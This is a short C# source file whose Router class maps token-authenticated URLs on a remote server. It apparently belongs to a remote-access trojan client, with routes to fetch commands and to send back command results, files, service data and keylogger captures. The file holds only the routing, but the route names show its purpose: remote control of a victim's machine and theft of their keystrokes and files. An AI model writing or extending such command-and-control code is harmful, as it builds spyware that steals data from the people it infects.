using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC
{
    public class Router
    {
        public static Dictionary<String, String> path = new Dictionary<String, String>();

        public static string url(string conn, bool addTok = true)
        {
            string param = string.Empty;
            if (addTok)
            {
                if (conn.Contains("?"))
                {
                    param = "&";
                }
                else
                {
                    param = "?";
                }
                param += "token=" + Parametre.jeton;
            }
            return Parametre.URL + path[conn] + param;
        }

        public static void load()
        {
            path.Add("auth", "auth/index/");
            path.Add("get_command", "commande/get/");
            path.Add("send_result", "result/send/");
            path.Add("send_file", "file/send/");
            path.Add("send_service_result", "file/send/");

            path.Add("send_service", "file/service/send/");
            path.Add("send_keylog", "result/send/");

            path.Add("ip", "tool/ip/");
        }
    }
}
